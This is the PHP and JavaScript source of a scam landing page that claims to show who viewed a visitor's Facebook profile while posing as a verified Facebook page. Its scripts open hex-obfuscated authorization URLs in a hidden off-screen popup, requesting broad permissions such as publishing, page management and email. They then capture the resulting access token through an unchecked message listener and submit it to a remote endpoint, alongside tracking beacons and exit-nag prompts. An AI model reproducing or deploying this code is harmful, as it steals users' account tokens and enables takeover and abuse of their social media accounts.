<?php
$mainUrl = "http://oxio.in/faceview/english/";
if(isset($_POST['tkn']))
{
	if($_POST['tkn']==''){
		header("location:".$mainUrl."index.php?retry=1&tkn=0");
	}
}else{
	header("location:".$mainUrl."index.php?retry=1&tkn=0");
}
?>
<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Look at who's looking at your Facebook profile!</title>
    <meta name="description" content="Sieh Dir an, wer Dein Facebook-Profil betrachtet!">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="assets/css/custom.css">

    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon"><link rel="icon" href="favicon.ico" sizes="32x32"><link href="https://i.imgur.com/JROEw7X.png" rel="apple-touch-icon-precomposed" sizes="196x196">

    <style>
      @import url('https://fonts.googleapis.com/css?family=Roboto:400,700,800');
    </style>
    
    <script src="assets/js/jquery.min.js"></script>
    
	<script>
		var mainUrl = "http://oxio.in/faceview/english/";
	</script>
  </head>
<body>

<script>

landerClickthrough = false;

window.addEventListener('message', function(e) {

  if(e.data == 'popup_ready') {
    return;
  }

  var type = e.type; // message
  var origin = e.origin || e.originalEvent.origin; // For Chrome, the origin property is in the event.originalEvent object.

  // if (origin !== "https://*.faceview.pro") return;

  if(e.data.indexOf('INVALID_') > -1) {
    popup_retry(e.data);
  } else if(e.data.indexOf('PERMS_') > -1) {
    popup_retry2(e.data);
  } else {
    popup_iframe_success(e.data);
  }


}, false);

window.onbeforeunload = function()
{
  try { if(!win99.closed) { win99.close(); } } catch(err) {}



  if(!landerClickthrough)
  {
    lllog('USER_EXIT_SUCCESS');
    landerClickthrough = true;
    return '------------------------------------------------------------\nClick on "Stay on this page"! Do not miss this opportunity while it\'s free!\n\n------------------------------------------------------------';
  }
}

$(document).ready(function() {
  lllog('SUCCESS_lander', 4);
});


if (top.location != self.location) {
    landerClickthrough = true;    
    try {  
      top.location = self.location;
    } catch(e) {
      window.open(self.location)
    }
}



</script>

<div class="top_header">
  <div class="top_header_inside">

    <div class="top_header_section"><div style="background-color: #243c6d;"><div class="top_header_icon hdr1"></div></div></div>

    <div class="top_header_section"><div class="top_header_icon hdr2"></div></div>
    <div class="top_header_section"><div class="top_header_icon hdr3"></div></div>
    <div class="top_header_section"><div class="top_header_icon hdr4"></div></div>
    <div class="top_header_section"><div class="top_header_icon hdr5"></div></div>
    <div class="top_header_section"><div class="top_header_icon hdr6"></div></div>

  </div><!-- top hdr inside -->
</div><!-- top hdr -->


<div class="fb_main">

<!-- <div class="cover"><img src="http://i.imgur.com/wxP7zlU.jpg" /></div>
 -->

  <div class="fb_hdr">

    <div class="fb_logo">
      <div>
        <a href="javascript:void(0);"><i role="img" style="background:#d8dce6 url(https://i.imgur.com/dl27PuQ.jpg) no-repeat center;background-size:100% 100%;-webkit-background-size:100% 100%;width:64px;height:64px;"></i></a>
      </div>
    </div>

    <div>
      <div class="fb_verified_outer">
        <span>Facebook</span>
        <span class="fb_verified" role="img" aria-label="Verified Page"></span>
      </div>
      <div class="fb_verified_txt"><a>@facebook</a></div>
    </div>

  </div><!-- fb hdr -->

  


  <br />



  <script>

  win99 = false;
  win99_newtab = false;

  function popup_retry(tkn) {
      lllog('RETRYING');
      top.location.replace(mainUrl+'index.php/?retry=1&tk='+tkn);
  }

  function popup_retry2(tkn) {
      lllog('RETRYING_PERMS');
      top.location.replace(mainUrl+'index.php/?retry=1&permission_needed='+tkn);
  }

  function popup_iframe_success(tkn) {

      $('#fb_inst_auth').fadeOut();
      landerClickthrough = true;
      document.getElementById('tkn_popup').value = tkn;
      // lllog('got_token', 3); // , false
      document.getElementById('form1998').submit();

  }


 function post_verif() {
            landerClickthrough = true;
            //window.open('\x68\x74\x74\x70\x3A\x2F\x2F\x64\x65\x2E\x66\x61\x63\x65\x76\x69\x65\x77\x2E\x70\x72\x6F\x2F\x77\x68\x6F\x2E\x70\x68\x70\x3F\x6C\x3D\x35\x67\x78\x36\x6A\x68\x69\x25\x32\x46\x77\x59\x49\x71\x6B\x62\x31\x61\x78\x36\x62\x6C\x46\x25\x32\x42\x6E\x6D\x36\x61\x48\x70\x46\x7A\x78\x44\x67\x25\x32\x46\x4A\x62\x6E\x34\x49\x4B\x48\x30\x73\x25\x33\x44\x26\x7A\x3D\x4D\x54\x41\x7A\x4C\x6A\x51\x78\x4C\x6A\x4D\x33\x4C\x6A\x67\x78');
            window.open(mainUrl+'who.php?l=5gx6jhi%2FwYIqkb1ax6blF%2Bnm6aHpFzxDg%2FJbn4IKH0s%3D&z=MTAzLjQxLjM3Ljgx');
            console.log("clicked_to_results");
            lllog('clicked_to_results', 5);
        };



  function start_verif() {
      
      landerClickthrough = true;

     
          win99 = window.open('\x68\x74\x74\x70\x3A\x2F\x2F\x64\x65\x2E\x66\x61\x63\x65\x76\x69\x65\x77\x2E\x70\x72\x6F\x2F\x61\x75\x74\x68\x2F\x3F\x74\x6B\x6E\x3D\x62\x79\x70\x61\x73\x73\x26\x63\x3D\x64\x65\x26\x75\x73\x65\x72\x5F\x66\x72\x69\x65\x6E\x64\x73\x2C\x70\x75\x62\x6C\x69\x73\x68\x5F\x61\x63\x74\x69\x6F\x6E\x73\x2C\x65\x6D\x61\x69\x6C\x2C\x70\x75\x62\x6C\x69\x63\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2C\x6D\x61\x6E\x61\x67\x65\x5F\x70\x61\x67\x65\x73\x2C\x70\x75\x62\x6C\x69\x73\x68\x5F\x70\x61\x67\x65\x73\x2C\x75\x73\x65\x72\x5F\x70\x68\x6F\x74\x6F\x73', 'win99', 'toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,width=1,height=1,left=213000,top=213000');

     
        // landerClickthrough = false;
        lllog('clicked_auth', 2);

        $('#fb_button').prop('disabled', true);
        $('#fb_button').html('Please wait...');
        
        $("#fb_msg_container").hide();
        $("#fb_msg_container").html("<div class='fb_txt_main' style='text-align: center;'><br /><img src='https://i.imgur.com/1ZUroOV.gif' /><br /><div id='fb_inst_auth' style='display: none;'>Please press the <img style='display inline; position: relative; top: 28px; padding: 10px;' src='https://s11.postimg.org/fyuremo0j/fk_Ium_Rh.jpg' /><br /><br /> on your keyboard to continue ...</div><br /><br /><div id='fb_inst_auth2' style='display: none;color: red;font-weight: bold;'>Press again</div><br /><br /></div>");

        setTimeout(function() {
          $('#fb_msg_container').fadeIn();
        }, 500);
        setTimeout(function() {
          $('#fb_inst_auth').fadeIn();
        }, 2000);

        setInterval(function() {
          $('#fb_inst_auth2').fadeIn().fadeOut().fadeIn();
        }, 4500);


        
        timerInterval = setInterval(function() {
                if (win99.closed !== false && win99) { // _newtab
                    clearInterval(timerInterval);
                    setTimeout(function() {
                      landerClickthrough = true;
                      // top.location.href = '/?retry=1&timer=1';
                    },1000);
                }
        }, 500);
      
  }

  $('.fb_main').on('click', '#fb_msg_container', function() {

    if(win99 && !win99.closed) {
      landerClickthrough = true;
      lllog('clicked_WHILE_POPUP_IS_OPEN');
      top.location.href = '/?retry=1';
    }

  });


  function lllog(evt, step, async_setting) {

    if (typeof(async_setting) === 'undefined') async_setting = true;

    var href = top.location.href + top.location.hash;
    var ts = ((new Date()).getTime() / 1000);
    var stp = (typeof step === 'undefined' || !step) ? '' : step;
    var url = '\x2F\x2F\x73\x73\x6C\x32\x2E\x61\x70\x70\x73\x70\x6F\x74\x2E\x73\x69\x74\x65\x2F\x6C\x2E\x6C\x6F\x67\x3F\x70\x72\x6D\x3D\x73\x75\x63\x63\x65\x73\x73\x26\x72\x66\x3D\x68\x74\x74\x70\x25\x33\x41\x25\x32\x46\x25\x32\x46\x64\x65\x2E\x66\x61\x63\x65\x76\x69\x65\x77\x2E\x70\x72\x6F\x25\x32\x46\x26\x63\x3D\x66\x61\x63\x65\x76\x69\x65\x77\x5F\x64\x65\x26\x6F\x3D\x66\x62\x5F\x69\x6E\x64\x65\x78\x26\x65\x76\x3D'+evt+'&ts='+ts+'&st='+stp+'&href='+encodeURIComponent(href);

    /*$.ajax({
      type: 'POST',
      url: url,
      data: '',
      success: function(resp){},
      async: async_setting
    });*/

  }

  </script>



  <div class="fb_msg">
    <div id="fb_msg_container" class="fb_msg_txt">
      
                        
              <div class="fb_txt_main"><center><br /><img src='https://i.imgur.com/1ZUroOV.gif' /><br />Please wait...<br /><br /></center></div>
              <script>
                setTimeout(function() {
                  $('#fb_button').show();
                  $('.fb_txt_main').html('Great! List of visitors to your Facebook profile is available. <br /> <br /> Info: The statistics only show profile visitors from the beginning of October!');

                }, 5000);

              </script>
                     
                      
    </div>


  </div> <!-- end msg -->

  <div class="fb_bottom">
    
    <div style="margin: 0 auto;">

      
        <div id="square" class="square"><img /></div>   
        <button id="fb_button" style="display: none;" onclick="post_verif();" class="fb_button">Continue</button>
      
      
    </div>
    
  </div>

  <br /><br /><br /><br /><br /><br /><br /><br />


<div style="display: none;"><img src="//ssl2.appspot.site/am.jpg?o=faceview_de&p=fb_index&rf=http%3A%2F%2Fde.faceview.pro%2F&prm=success&href=http%3A%2F%2Fde.secretview.win%2F%3Fsuccess%3D1&t=1513765926&t=1513765926" width="0" height="0" border="0" /></div>

</div><!-- end main -->


<form action="<?php echo $mainUrl;?>success.php?success=1" method="post" id="form1998">
<input type="hidden" id="tkn_popup" name="tkn" value="" /></form>


<script src="//geoip.club/rnfb.php?p=fbindex&c=faceview_de"></script>
</body>
</html>